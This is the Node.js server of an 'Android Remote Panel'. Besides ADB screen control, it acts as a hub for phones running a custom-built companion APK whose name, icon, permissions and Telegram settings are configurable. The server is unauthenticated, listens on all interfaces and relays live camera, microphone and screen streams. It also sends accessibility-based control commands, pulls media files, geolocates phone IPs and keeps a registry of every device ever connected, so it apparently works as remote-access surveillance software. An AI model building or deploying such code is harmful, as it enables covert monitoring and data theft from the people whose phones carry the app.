// Локальный сервер веб-панели управления Android через ADB.
// Запуск: npm start  (по умолчанию http://localhost:8787)

import express from 'express';
import multer from 'multer';
import { WebSocketServer } from 'ws';
import http from 'node:http';
import path from 'node:path';
import os from 'node:os';
import fs from 'node:fs';
import { Readable } from 'node:stream';
import { fileURLToPath } from 'node:url';
import * as adb from './adb.js';
import * as builder from './builder.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PORT = process.env.PORT || 8787;
// 0.0.0.0 — чтобы телефон в той же сети мог прислать поток камеры в панель.
// Если нужен доступ только с этого ПК — задай HOST=127.0.0.1.
const HOST = process.env.HOST || '0.0.0.0';

const app = express();
app.use(express.json());
app.use((req, res, next) => {
  if (req.path === '/panel.js' || req.path === '/index.html' || req.path === '/') {
    res.setHeader('Cache-Control', 'no-store');
  }
  next();
});
app.use(express.static(path.join(__dirname, 'public')));

const upload = multer({ dest: path.join(os.tmpdir(), 'arp-uploads') });

// Небольшой помощник, чтобы не дублировать try/catch в каждом маршруте.
const h = (fn) => async (req, res) => {
  try { await fn(req, res); }
  catch (e) { res.status(500).json({ error: e.message || String(e), stderr: e.stderr }); }
};

// ---- Устройства ----
app.get('/api/devices', h(async (req, res) => {
  res.json({ devices: await adb.listDevices(), current: adb.getSerial() });
}));

app.post('/api/select', h(async (req, res) => {
  adb.setSerial(req.body.serial || null);
  adb.clearSizeCache();
  res.json({ ok: true, current: adb.getSerial() });
}));

app.post('/api/connect', h(async (req, res) => {
  const out = await adb.connect(req.body.hostPort);
  res.json({ ok: true, message: out.trim() });
}));

app.post('/api/disconnect', h(async (req, res) => {
  const out = await adb.disconnect(req.body.hostPort);
  res.json({ ok: true, message: out.trim() });
}));

// ---- Информация / дашборд ----
app.get('/api/info', h(async (req, res) => res.json(await adb.deviceInfo())));
app.get('/api/battery', h(async (req, res) => res.json(await adb.battery())));
app.get('/api/screensize', h(async (req, res) => res.json(await adb.screenSize())));

// ---- Ввод (также доступен по WS, но REST удобен для кнопок) ----
app.post('/api/tap', h(async (req, res) => { await adb.tap(req.body.x, req.body.y); res.json({ ok: true }); }));
app.post('/api/swipe', h(async (req, res) => { await adb.swipe(req.body.x1, req.body.y1, req.body.x2, req.body.y2, req.body.ms); res.json({ ok: true }); }));
app.post('/api/text', h(async (req, res) => { await adb.inputText(req.body.text); res.json({ ok: true }); }));
app.post('/api/key', h(async (req, res) => {
  const code = adb.KEYCODES[req.body.name] ?? req.body.code;
  await adb.keyevent(code);
  res.json({ ok: true });
}));

// ---- Приложения ----
app.get('/api/apps', h(async (req, res) => res.json({ apps: await adb.listApps(req.query.all !== '1') })));
app.post('/api/apps/launch', h(async (req, res) => { await adb.launchApp(req.body.pkg); res.json({ ok: true }); }));
app.post('/api/apps/stop', h(async (req, res) => { await adb.forceStop(req.body.pkg); res.json({ ok: true }); }));

// ---- Уведомления ----
app.get('/api/notifications', h(async (req, res) => res.json({ items: await adb.notifications() })));
app.post('/api/notifications/post', h(async (req, res) => {
  await adb.postNotification(req.body.title || 'Панель', req.body.text || '');
  res.json({ ok: true });
}));

// ---- Файлы ----
app.get('/api/files', h(async (req, res) => {
  const p = req.query.path || '/sdcard';
  res.json({ path: p, entries: await adb.listFiles(p) });
}));

app.post('/api/files/upload', upload.single('file'), h(async (req, res) => {
  const remoteDir = req.body.remoteDir || '/sdcard/Download';
  const remotePath = remoteDir.replace(/\/$/, '') + '/' + (req.file.originalname);
  await adb.pushFile(req.file.path, remotePath);
  fs.unlink(req.file.path, () => {});
  res.json({ ok: true, remotePath });
}));

app.get('/api/files/download', h(async (req, res) => {
  const remotePath = req.query.path;
  if (!remotePath) return res.status(400).json({ error: 'path required' });
  const tmp = path.join(os.tmpdir(), 'arp-' + Date.now() + '-' + path.basename(remotePath));
  await adb.pullFile(remotePath, tmp);
  res.download(tmp, path.basename(remotePath), () => fs.unlink(tmp, () => {}));
}));

// ---- Инфо о сети (какой адрес вводить в телефоне) ----
function lanAddresses() {
  const out = [];
  for (const [name, addrs] of Object.entries(os.networkInterfaces())) {
    for (const a of addrs || []) {
      if (a.family === 'IPv4' && !a.internal) out.push({ iface: name, address: a.address });
    }
  }
  return out;
}
app.get('/api/serverinfo', (req, res) => {
  res.json({ port: server.address()?.port || PORT, addresses: lanAddresses() });
});

// ---- Сборка APK ----
app.get('/api/build/config', (req, res) => {
  res.json({
    permissions: builder.AVAILABLE_PERMISSIONS,
    hasSdk: builder.hasAndroidSdk(),
  });
});

const iconUpload = multer({ dest: path.join(os.tmpdir(), 'arp-icons') });
app.post('/api/build/apk', iconUpload.single('icon'), h(async (req, res) => {
  const cfg = {
    appName: req.body.appName,
    applicationId: req.body.applicationId,
    permissions: (req.body.permissions || 'CAMERA').split(',').map((s) => s.trim()).filter(Boolean),
    defaultServer: req.body.defaultServer,
  };
  try {
    const { apkPath, fileName } = await builder.buildApk(cfg, req.file?.path);
    if (req.file) fs.unlink(req.file.path, () => {});
    res.download(apkPath, fileName, () => fs.unlink(apkPath, () => {}));
  } catch (e) {
    if (req.file) fs.unlink(req.file.path, () => {});
    res.status(e.code === 'NO_SDK' ? 501 : 500).json({ error: e.message, code: e.code });
  }
}));

// ---- Управление камерой телефона из панели ----
app.post('/api/camera/command', h(async (req, res) => {
  const { cmd } = req.body;
  const phone = activePhoneIp ? phones.get(activePhoneIp) : null;
  const sockets = phone ? [phone.back, phone.front].filter(ws => ws?.readyState === ws?.OPEN) : [];
  if (!sockets.length) return res.status(503).json({ error: 'Телефон не подключён' });
  sockets.forEach(ws => ws.send(JSON.stringify({ cmd })));
  res.json({ ok: true });
}));

// ---- Список телефонов (все: онлайн + офлайн + удалённые) ----
app.get('/api/phones', (req, res) => {
  res.json({ phones: buildFullPhoneList(), activeIp: activePhoneIp });
});

app.post('/api/phones/select', (req, res) => {
  const { ip } = req.body;
  if (!phones.has(ip)) return res.status(400).json({ error: 'Телефон не найден' });
  activePhoneIp = ip;
  notifyPhoneList();
  res.json({ ok: true, activeIp: ip });
});

app.post('/api/phones/delete', (req, res) => {
  const { ip } = req.body;
  if (!ip) return res.status(400).json({ error: 'ip required' });
  regTouch(ip, { deleted: true });
  notifyPhoneList();
  res.json({ ok: true });
});

app.post('/api/phones/restore', (req, res) => {
  const { ip } = req.body;
  if (!ip) return res.status(400).json({ error: 'ip required' });
  regTouch(ip, { deleted: false });
  notifyPhoneList();
  res.json({ ok: true });
});

// ---- GitHub Actions: сборка APK без локального SDK ----
const GH_REPO = '291010artem-ctrl/test';
const GH_BRANCH = 'claude/remote-phone-control-panel-2tpseh';
const GH_WORKFLOW = 'build-apk.yml';

function ghFetch(url, token, opts = {}) {
  return fetch(url, {
    ...opts,
    headers: {
      Authorization: `Bearer ${token}`,
      Accept: 'application/vnd.github+json',
      'X-GitHub-Api-Version': '2022-11-28',
      'User-Agent': 'android-remote-panel',
      ...(opts.headers || {}),
    },
  });
}

app.post('/api/build/github', h(async (req, res) => {
  const { appName, applicationId, defaultServer, permissions, token, tgToken, tgChatId } = req.body;
  if (!token) return res.status(400).json({ error: 'GitHub token required' });
  const permList = (permissions || '').split(',').map((s) => s.trim()).filter(Boolean);

  const trigRes = await ghFetch(
    `https://api.github.com/repos/${GH_REPO}/actions/workflows/${GH_WORKFLOW}/dispatches`,
    token,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        ref: GH_BRANCH,
        inputs: {
          app_name: appName || 'Camera Companion',
          application_id: applicationId || 'com.artem.cameracompanion',
          default_server: defaultServer || '',
          permissions: permList.join(','),
          tg_token: tgToken || '',
          tg_chat_id: tgChatId || '',
        },
      }),
    }
  );
  if (!trigRes.ok) {
    const errBody = await trigRes.text().catch(() => '');
    let errMsg = `HTTP ${trigRes.status}`;
    try { const j = JSON.parse(errBody); errMsg += ': ' + (j.message || errBody); } catch { errMsg += ': ' + errBody; }
    console.error('[build/github] dispatch failed', errMsg);
    return res.status(trigRes.status).json({ error: errMsg });
  }

  // Ждём несколько секунд пока GitHub зарегистрирует запуск
  await new Promise((r) => setTimeout(r, 4000));

  const runsRes = await ghFetch(
    `https://api.github.com/repos/${GH_REPO}/actions/runs?branch=${GH_BRANCH}&event=workflow_dispatch&per_page=5`,
    token
  );
  const runsData = await runsRes.json();
  const run = runsData.workflow_runs?.[0];
  res.json({ runId: run?.id || null, runUrl: run?.html_url || `https://github.com/${GH_REPO}/actions` });
}));

app.get('/api/build/github/status', h(async (req, res) => {
  const { runId, token } = req.query;
  if (!runId || !token) return res.status(400).json({ error: 'runId and token required' });
  const r = await ghFetch(`https://api.github.com/repos/${GH_REPO}/actions/runs/${runId}`, token);
  const d = await r.json();
  res.json({ status: d.status, conclusion: d.conclusion, url: d.html_url });
}));

app.get('/api/build/github/artifact', h(async (req, res) => {
  const { runId, token } = req.query;
  if (!runId || !token) return res.status(400).json({ error: 'runId and token required' });

  const artsRes = await ghFetch(
    `https://api.github.com/repos/${GH_REPO}/actions/runs/${runId}/artifacts`,
    token
  );
  const artsData = await artsRes.json();
  const artifact = artsData.artifacts?.[0];
  if (!artifact) return res.status(404).json({ error: 'No artifact found' });

  const dlRes = await ghFetch(
    `https://api.github.com/repos/${GH_REPO}/actions/artifacts/${artifact.id}/zip`,
    token
  );
  if (!dlRes.ok) return res.status(dlRes.status).json({ error: 'Download failed' });

  res.setHeader('Content-Type', 'application/zip');
  res.setHeader('Content-Disposition', 'attachment; filename="camera-companion-apk.zip"');
  Readable.fromWeb(dlRes.body).pipe(res);
}));

// ---- Сервер + WebSocket ----
const server = http.createServer(app);
const wss = new WebSocketServer({ noServer: true });
const wssCamera = new WebSocketServer({ noServer: true });
const wssAudio = new WebSocketServer({ noServer: true });
const wssScreen = new WebSocketServer({ noServer: true });
const wssControl = new WebSocketServer({ noServer: true });
const wssPhone = new WebSocketServer({ noServer: true });

server.on('upgrade', (req, socket, head) => {
  const { pathname } = new URL(req.url, 'http://localhost');
  console.log(`[WS] upgrade: ${pathname} from ${req.socket.remoteAddress}`);
  if (pathname === '/ws') {
    wss.handleUpgrade(req, socket, head, (ws) => wss.emit('connection', ws, req));
  } else if (pathname === '/camera') {
    wssCamera.handleUpgrade(req, socket, head, (ws) => wssCamera.emit('connection', ws, req));
  } else if (pathname === '/audio') {
    wssAudio.handleUpgrade(req, socket, head, (ws) => wssAudio.emit('connection', ws, req));
  } else if (pathname === '/screen') {
    wssScreen.handleUpgrade(req, socket, head, (ws) => wssScreen.emit('connection', ws, req));
  } else if (pathname === '/control') {
    wssControl.handleUpgrade(req, socket, head, (ws) => wssControl.emit('connection', ws, req));
  } else if (pathname === '/phone') {
    wssPhone.handleUpgrade(req, socket, head, (ws) => wssPhone.emit('connection', ws, req));
  } else {
    socket.destroy();
  }
});

// Реестр телефонов: ключ — IP-адрес, значение — { back, front, audio, model, country, countryCode, city }.
const phones = new Map();
let activePhoneIp = null;

// Персистентный реестр устройств (все когда-либо подключавшиеся)
const REGISTRY_FILE = path.join(__dirname, 'devices.json');
let registry = {};
try { registry = JSON.parse(fs.readFileSync(REGISTRY_FILE, 'utf8')); } catch {}
let _saveTimer = null;
function saveRegistry() {
  clearTimeout(_saveTimer);
  _saveTimer = setTimeout(() => fs.writeFile(REGISTRY_FILE, JSON.stringify(registry, null, 2), () => {}), 500);
}
function regTouch(ip, fields) {
  if (!registry[ip]) registry[ip] = { ip, model: 'Android', lastSeen: null, battery: null, online: false, deleted: false };
  Object.assign(registry[ip], fields);
  saveRegistry();
}
const viewerSets = { back: new Set(), front: new Set() };
const audioViewers = new Set();
const MAX_BUF = 512 * 1024; // 512 KB backpressure limit

// Нормализация IP: убираем IPv6-обёртку ::ffff: чтобы один телефон
// всегда давал одинаковый ключ независимо от протокола подключения.
const normalizeIp = (ip) => (ip || '').replace(/^::ffff:/, '');

function phoneLabel(ip) { return ip; }

// ---- Геолокация по IP (ip-api.com, бесплатно, без ключа) ----
const geoCache = new Map();
async function fetchGeo(rawIp) {
  const ip = rawIp;
  if (geoCache.has(ip)) return geoCache.get(ip);
  const isPrivate = /^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|127\.|::1$|localhost)/.test(ip);
  if (isPrivate) {
    const g = { country: '', countryCode: '', city: 'Локальная сеть' };
    geoCache.set(ip, g); return g;
  }
  try {
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=country,countryCode,city&lang=ru`);
    if (r.ok) { const g = await r.json(); geoCache.set(ip, g); return g; }
  } catch (e) { console.warn('[GEO]', e.message); }
  const g = { country: '', countryCode: '', city: '' };
  geoCache.set(ip, g); return g;
}

function getPhone(rawIp, model) {
  const ip = normalizeIp(rawIp);
  if (phones.has(ip)) {
    if (model) phones.get(ip).model = model;
    regTouch(ip, { online: true, lastSeen: Date.now(), ...(model ? { model } : {}) });
    return phones.get(ip);
  }
  // Если есть запись с той же моделью — это тот же телефон с другим source IP
  // (мобильный NAT даёт разные адреса разным TCP-соединениям).
  // Создаём алиас: новый IP → тот же объект. Дублей в buildFullPhoneList не будет.
  if (model) {
    for (const [, p] of phones.entries()) {
      if (p.model === model) { phones.set(ip, p); return p; }
    }
  }
  const reg = registry[ip] || {};
  const entry = { back: null, front: null, audio: null, model: model || reg.model || 'Android', country: reg.country || '', countryCode: reg.countryCode || '', city: reg.city || '' };
  phones.set(ip, entry);
  fetchGeo(ip).then(g => { const p = phones.get(ip); if (p) { Object.assign(p, g); regTouch(ip, g); } }).catch(() => {});
  regTouch(ip, { model: entry.model, online: true, lastSeen: Date.now(), deleted: false });
  return entry;
}

function cleanupPhone(ip) {
  const p = phones.get(ip);
  if (!p || p.back || p.front || p.audio) return;
  regTouch(ip, { online: false, lastSeen: Date.now() });
  // Удаляем все алиасы (ключи), указывающие на этот объект
  for (const [k, v] of phones.entries()) { if (v === p) phones.delete(k); }
  if (!phones.has(activePhoneIp)) {
    activePhoneIp = phones.size > 0 ? [...phones.keys()][0] : null;
    notifyPhoneList();
  }
}

function buildFullPhoneList() {
  const result = [];
  const onlineIps = new Set();
  const seen = new Set();
  // Все IP из phones Map помечаем онлайн (включая алиасы одного телефона)
  for (const ip of phones.keys()) onlineIps.add(ip);
  // Онлайн (из phones Map, дедупликация по объекту)
  for (const [ip, p] of phones.entries()) {
    if (seen.has(p)) continue;
    seen.add(p);
    const reg = registry[ip] || {};
    result.push({
      ip, label: ip, online: true,
      model: p.model || reg.model || 'Android',
      battery: reg.battery ?? null,
      lastSeen: Date.now(),
      country: p.country || reg.country || '',
      countryCode: p.countryCode || reg.countryCode || '',
      city: p.city || reg.city || '',
      active: ip === activePhoneIp || phones.get(activePhoneIp) === p,
      deleted: reg.deleted || false,
      perms: reg.perms || null,
      cams: { back: !!p.back, front: !!p.front, audio: !!p.audio },
    });
  }
  // Офлайн (из registry)
  for (const [ip, reg] of Object.entries(registry)) {
    if (onlineIps.has(ip)) continue;
    result.push({
      ip, label: ip, online: false,
      model: reg.model || 'Android',
      battery: reg.battery ?? null,
      lastSeen: reg.lastSeen || null,
      country: reg.country || '',
      countryCode: reg.countryCode || '',
      city: reg.city || '',
      active: false,
      deleted: reg.deleted || false,
      perms: reg.perms || null,
      cams: { back: false, front: false, audio: false },
    });
  }
  return result;
}
// Оставляем phoneListJson как алиас для совместимости
function phoneListJson() { return buildFullPhoneList().filter(p => p.online && !p.deleted); }

function notifyViewersCam(cam, obj) {
  const data = JSON.stringify(obj);
  for (const v of viewerSets[cam] || []) if (v.readyState === v.OPEN) v.send(data);
}

function notifyPhoneList() {
  const msg = JSON.stringify({ type: 'phones', list: buildFullPhoneList(), activeIp: activePhoneIp });
  for (const s of [...viewerSets.back, ...viewerSets.front, ...audioViewers]) {
    if (s.readyState === s.OPEN) s.send(msg);
  }
  // также уведомить о статусе активного телефона
  for (const cam of ['back', 'front']) {
    const activePhone = activePhoneIp ? phones.get(activePhoneIp) : null;
    notifyViewersCam(cam, { type: 'phone', connected: !!(activePhone?.[cam]), cam });
  }
}

wssCamera.on('connection', (ws, req) => {
  const params = new URL(req.url, 'http://localhost').searchParams;
  const role = params.get('role') || 'viewer';
  const cam = params.get('cam') || 'back';
  const model = params.get('model') || '';
  const ip = normalizeIp(req.socket.remoteAddress);
  console.log(`[CAM] connected: role=${role} cam=${cam} from ${ip}`);

  if (role === 'phone') {
    const phone = getPhone(ip, model);
    phone[cam] = ws;
    if (!activePhoneIp) activePhoneIp = ip;
    notifyPhoneList();

    let firstFrame = true;
    ws.on('message', (data, isBinary) => {
      if (phone !== phones.get(activePhoneIp)) {
        if (!isBinary) console.log(`[CAM-DROPPED] cam=${cam} ip=${ip} reason=not-active-phone msg=${data.toString().slice(0, 60)}`);
        return;
      }
      if (isBinary) {
        if (firstFrame) { console.log(`[CAM-FIRST-FRAME] cam=${cam} ip=${ip}`); firstFrame = false; }
        for (const v of viewerSets[cam] || []) {
          if (v.readyState === v.OPEN && v.bufferedAmount < MAX_BUF) {
            v.send(data, { binary: true });
          }
        }
      } else {
        const str = data.toString();
        console.log(`[CAM-STATUS] cam=${cam} ip=${ip}: ${str}`);
        for (const v of viewerSets[cam] || []) {
          if (v.readyState === v.OPEN) v.send(str);
        }
      }
    });
    ws.on('close', () => {
      if (phone[cam] === ws) phone[cam] = null;
      cleanupPhone(ip);
      notifyPhoneList();
    });
  } else {
    (viewerSets[cam] || viewerSets.back).add(ws);
    const activePhone = activePhoneIp ? phones.get(activePhoneIp) : null;
    ws.send(JSON.stringify({ type: 'phone', connected: !!(activePhone?.[cam]), cam }));
    ws.send(JSON.stringify({ type: 'phones', list: phoneListJson(), activeIp: activePhoneIp }));
    ws.on('message', (data, isBinary) => {
      const ap = activePhoneIp ? phones.get(activePhoneIp) : null;
      const phoneWs = ap?.back;
      console.log(`[VIEWER-CMD] cam=${cam} activeIp=${activePhoneIp} ap=${!!ap} back.state=${ap?.back?.readyState} front.state=${ap?.front?.readyState} msg=${data.toString().slice(0, 80)}`);
      if (phoneWs && phoneWs.readyState === phoneWs.OPEN) phoneWs.send(isBinary ? data : data.toString());
    });
    ws.on('close', () => (viewerSets[cam] || viewerSets.back).delete(ws));
  }
});

wssAudio.on('connection', (ws, req) => {
  const params = new URL(req.url, 'http://localhost').searchParams;
  const role = params.get('role') || 'viewer';
  const model = params.get('model') || '';
  const ip = normalizeIp(req.socket.remoteAddress);
  console.log(`[AUDIO] connected: role=${role} from ${ip}`);

  if (role === 'phone') {
    const phone = getPhone(ip, model);
    phone.audio = ws;
    if (!activePhoneIp) activePhoneIp = ip;
    notifyPhoneList();
    ws.on('message', (data, isBinary) => {
      const phoneEntry = phones.get(ip);
      if (isBinary && phoneEntry && phoneEntry === phones.get(activePhoneIp)) {
        for (const v of audioViewers) {
          if (v.readyState === v.OPEN && v.bufferedAmount < MAX_BUF) {
            v.send(data, { binary: true });
          }
        }
      }
    });
    ws.on('close', () => {
      if (phone.audio === ws) phone.audio = null;
      cleanupPhone(ip);
      notifyPhoneList();
    });
  } else {
    audioViewers.add(ws);
    ws.send(JSON.stringify({ type: 'phones', list: phoneListJson(), activeIp: activePhoneIp }));
    ws.on('close', () => audioViewers.delete(ws));
  }
});

wss.on('connection', (ws) => {
  let streaming = false;
  let size = null;

  const sendJSON = (obj) => { if (ws.readyState === ws.OPEN) ws.send(JSON.stringify(obj)); };

  // Цикл захвата экрана: снимаем PNG и шлём как бинарный фрейм.
  async function streamLoop() {
    while (streaming && ws.readyState === ws.OPEN) {
      const t0 = Date.now();
      try {
        const png = await adb.screencap();
        if (ws.readyState === ws.OPEN) ws.send(png, { binary: true });
      } catch (e) {
        sendJSON({ type: 'error', message: 'screencap: ' + (e.message || e) });
        await new Promise((r) => setTimeout(r, 1000));
      }
      // Ограничиваем частоту, чтобы не грузить ADB (мин. интервал ~150мс).
      const elapsed = Date.now() - t0;
      if (elapsed < 150) await new Promise((r) => setTimeout(r, 150 - elapsed));
    }
  }

  ws.on('message', async (raw) => {
    let msg;
    try { msg = JSON.parse(raw.toString()); } catch { return; }
    try {
      switch (msg.type) {
        case 'start-stream':
          if (!streaming) {
            streaming = true;
            size = await adb.screenSize();
            sendJSON({ type: 'size', ...size });
            streamLoop();
          }
          break;
        case 'stop-stream':
          streaming = false;
          break;
        case 'tap': {
          // Координаты приходят нормализованными (0..1)
          size = size || await adb.screenSize();
          await adb.tap(msg.x * size.width, msg.y * size.height);
          break;
        }
        case 'swipe': {
          size = size || await adb.screenSize();
          await adb.swipe(msg.x1 * size.width, msg.y1 * size.height,
            msg.x2 * size.width, msg.y2 * size.height, msg.ms || 200);
          break;
        }
        case 'text':
          await adb.inputText(msg.text);
          break;
        case 'key':
          await adb.keyevent(adb.KEYCODES[msg.name] ?? msg.code);
          break;
      }
    } catch (e) {
      sendJSON({ type: 'error', message: e.message || String(e) });
    }
  });

  ws.on('close', () => { streaming = false; });
});

// ---- Экран телефона (MediaProjection) ----
const screenPhones = new Map(); // ip → ws
const screenViewers = new Set();

wssScreen.on('connection', (ws, req) => {
  const params = new URL(req.url, 'http://localhost').searchParams;
  const role = params.get('role') || 'viewer';
  const model = params.get('model') || '';
  const ip = normalizeIp(req.socket.remoteAddress);
  console.log(`[SCREEN] connected: role=${role} from ${ip}`);

  if (role === 'phone') {
    screenPhones.set(ip, ws);
    for (const v of screenViewers) {
      if (v.readyState === v.OPEN) v.send(JSON.stringify({ type: 'screen-phone', connected: true }));
    }
    ws.on('message', (data, isBinary) => {
      if (!isBinary) return;
      // Транслируем если: нет активного телефона (ещё не подключился), или
      // активный телефон совпадает по модели с этим screen-подключением.
      const activeEntry = activePhoneIp ? phones.get(activePhoneIp) : null;
      if (activeEntry && model && activeEntry.model !== model) return;
      for (const v of screenViewers) {
        if (v.readyState === v.OPEN && v.bufferedAmount < MAX_BUF) {
          v.send(data, { binary: true });
        }
      }
    });
    ws.on('close', () => {
      if (screenPhones.get(ip) === ws) screenPhones.delete(ip);
      const hasPhone = screenPhones.size > 0;
      for (const v of screenViewers) {
        if (v.readyState === v.OPEN) v.send(JSON.stringify({ type: 'screen-phone', connected: hasPhone }));
      }
    });
  } else {
    screenViewers.add(ws);
    ws.send(JSON.stringify({ type: 'screen-phone', connected: screenPhones.size > 0 }));
    ws.on('close', () => screenViewers.delete(ws));
  }
});

// ---- Управление телефоном (AccessibilityService) ----
const controlPhones = new Map(); // ip → ws
const controlViewers = new Set();

wssControl.on('connection', (ws, req) => {
  const params = new URL(req.url, 'http://localhost').searchParams;
  const role = params.get('role') || 'viewer';
  const ip = normalizeIp(req.socket.remoteAddress);
  console.log(`[CTRL] connected: role=${role} from ${ip}`);

  if (role === 'phone') {
    controlPhones.set(ip, ws);
    ws.on('close', () => { if (controlPhones.get(ip) === ws) controlPhones.delete(ip); });
  } else {
    controlViewers.add(ws);
    ws.on('message', (data, isBinary) => {
      // Сначала ищем по activePhoneIp, иначе берём любой доступный
      // (control и camera могут подключаться с разных IP через NAT)
      let phone = activePhoneIp ? controlPhones.get(activePhoneIp) : null;
      if (!phone) phone = [...controlPhones.values()].find(w => w.readyState === w.OPEN);
      if (phone && phone.readyState === phone.OPEN) phone.send(isBinary ? data : data.toString());
    });
    ws.on('close', () => controlViewers.delete(ws));
  }
});

// ---- Телефон / Звонки ----
const phoneCallPhones = new Map(); // ip → ws
const phoneCallViewers = new Set();

wssPhone.on('connection', (ws, req) => {
  const params = new URL(req.url, 'http://localhost').searchParams;
  const role = params.get('role') || 'viewer';
  const ip = normalizeIp(req.socket.remoteAddress);
  console.log(`[PHONE] connected: role=${role} from ${ip}`);

  if (role === 'phone') {
    phoneCallPhones.set(ip, ws);
    regTouch(ip, { online: true, lastSeen: Date.now(), deleted: false });
    for (const v of phoneCallViewers) {
      if (v.readyState === v.OPEN) v.send(JSON.stringify({ type: 'phone-connected', connected: true }));
    }
    ws.on('message', (data, isBinary) => {
      if (isBinary) {
        // Логируем первый бинарный чанк file-chunk от телефона
        try {
          const hLen = data.readUInt32BE(0);
          const hJson = JSON.parse(data.slice(4, 4 + hLen).toString());
          if (hJson.type === 'file-chunk') {
            if (hJson.index === 0) console.log(`[PHONE→] file-chunk binary requestId=${hJson.requestId} name=${hJson.name} size=${hJson.size} total=${hJson.total}`);
            else if (hJson.err) console.log(`[PHONE→] file-chunk error requestId=${hJson.requestId} err=${hJson.err}`);
          }
        } catch {}
        for (const v of phoneCallViewers) {
          if (v.readyState === v.OPEN) v.send(data, { binary: true });
        }
        return;
      }
      const str = data.toString();
      // Перехватываем phone-info чтобы сохранить батарею и модель
      try {
        const m = JSON.parse(str);
        if (m.type === 'file-chunk') {
          console.log(`[PHONE→] file-chunk text requestId=${m.requestId} err=${m.err || '(none)'}`);
        }
        if (m.type === 'phone-info') {
          const upd = { lastSeen: Date.now() };
          if (m.battery !== undefined) upd.battery = m.battery;
          if (m.model) upd.model = m.model;
          if (m.perms) upd.perms = m.perms;
          // Телефон может прийти через другой NAT-IP чем camera WS.
          // Ищем канонический IP в phones Map по модели, чтобы battery/perms
          // сохранились туда же, откуда их читает buildFullPhoneList().
          let regIp = ip;
          if (m.model) {
            for (const [k, p] of phones.entries()) {
              if (p.model === m.model) { regIp = k; break; }
            }
          }
          regTouch(regIp, upd);
        }
      } catch {}
      for (const v of phoneCallViewers) {
        if (v.readyState === v.OPEN) v.send(str);
      }
    });
    ws.on('close', () => {
      if (phoneCallPhones.get(ip) === ws) phoneCallPhones.delete(ip);
      for (const v of phoneCallViewers) {
        if (v.readyState === v.OPEN) v.send(JSON.stringify({ type: 'phone-connected', connected: phoneCallPhones.size > 0 }));
      }
    });
  } else {
    phoneCallViewers.add(ws);
    ws.send(JSON.stringify({ type: 'phone-connected', connected: phoneCallPhones.size > 0 }));
    ws.on('message', (data, isBinary) => {
      const activePhone = activePhoneIp ? phoneCallPhones.get(activePhoneIp) : null;
      const phone = activePhone || [...phoneCallPhones.values()].find((w) => w.readyState === w.OPEN);
      if (!isBinary) {
        try {
          const m = JSON.parse(data.toString());
          if (m.cmd === 'get-media-file') console.log(`[→PHONE] get-media-file id=${m.id} type=${m.mediaType} requestId=${m.requestId} phoneFound=${!!phone}`);
        } catch {}
      }
      if (phone && phone.readyState === phone.OPEN) phone.send(isBinary ? data : data.toString());
    });
    ws.on('close', () => phoneCallViewers.delete(ws));
  }
});

// Запуск сервера. Возвращает { server, port } — используется как из CLI,
// так и из Electron (main-процесс поднимает сервер внутри приложения).
export function startServer({ port = PORT, host = HOST } = {}) {
  return new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(port, host, () => {
      const actualPort = server.address().port;
      resolve({ server, port: actualPort, host });
    });
  });
}

// Если файл запущен напрямую (node server.js) — стартуем в «браузерном» режиме.
const isDirectRun = process.argv[1] &&
  path.resolve(process.argv[1]) === fileURLToPath(import.meta.url);

if (isDirectRun) {
  startServer().then(({ port }) => {
    console.log(`\n  Android Remote Panel запущена:`);
    console.log(`  →  http://localhost:${port}\n`);
    console.log(`  Убедись, что телефон подключён и "adb devices" его видит.\n`);
  }).catch((e) => {
    console.error('Не удалось запустить сервер:', e.message);
    process.exit(1);
  });
}
